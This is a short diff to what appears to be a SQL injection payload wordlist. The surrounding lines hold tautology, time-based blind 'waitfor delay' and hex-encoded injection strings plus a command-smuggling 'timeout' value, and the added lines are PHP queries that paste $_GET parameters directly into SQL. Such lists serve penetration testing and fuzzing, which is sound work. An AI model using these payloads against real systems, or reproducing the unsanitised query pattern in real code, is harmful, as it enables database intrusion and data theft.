@@ -39,6 +39,8 @@ test&timeout /T 15
 "1" or "1"="1" -- 
 a' waitfor delay '0:0:10'--
 1 waitfor delay '0:0:10'--
+Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);
+Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit".$_GET['c'])
 declare @q nvarchar (4000) select @q =
 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
 0
